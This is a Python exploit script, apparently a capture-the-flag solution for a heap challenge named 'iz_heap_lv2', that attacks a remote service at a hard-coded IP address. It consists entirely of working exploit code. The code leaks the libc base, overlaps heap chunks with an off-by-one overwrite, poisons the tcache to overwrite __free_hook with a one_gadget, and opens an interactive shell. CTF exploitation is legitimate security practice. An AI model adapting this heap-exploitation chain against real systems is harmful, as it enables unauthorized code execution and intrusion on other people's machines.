from ptrlib import *

def add(size, data):
    sock.sendlineafter("Choice: \n", "1")
    sock.sendlineafter("size: ", str(size))
    sock.sendafter("data: ", data)

def edit(index, data):
    sock.sendlineafter("Choice: \n", "2")
    sock.sendlineafter("index: ", str(index))
    sock.sendafter("data: ", data)

def delete(index):
    sock.sendlineafter("Choice: \n", "3")
    sock.sendlineafter("index: ", str(index))

def show(index):
    sock.sendlineafter("Choice: \n", "4")
    sock.sendlineafter("index: ", str(index))
    sock.recvuntil("Data: ")
    return sock.recvline()

libc = ELF("./libc.so.6")
libc_main_arena = 0x3ebc40
libc_one_gadget = 0x4f322#0x10a38c
delta = 0x60
#sock = Process("./iz_heap_lv2")
sock = Socket("165.22.110.249", 4444)

# libc leak
add(0x4f7, "B") # 0
add(0x4f7, "A") # 1
delete(0)
delete(1)
add(0x4f7, "A" * 8) # 0
libc_base = u64(show(0)[8:]) - libc_main_arena - delta
logger.info("libc base = " + hex(libc_base))

# chunk overlap
add(0x410, "1111") # 1
add(0x28, "2222")  # 2
add(0x4f0, "3333") # 3
add(0x20, "44444") # 4
delete(1)
edit(2, b"2" * 0x20 + p64(0x450))
delete(3)
delete(2)

# tcache poisoning
payload = b'A' * 0x418 + p64(0x31) + p64(libc_base + libc.symbol("__free_hook"))
add(0x800, payload) # 1
add(0x27, "dummy") # 2
add(0x27, p64(libc_base + libc_one_gadget)) # 3

# get the shell!
delete(2)

sock.interactive()
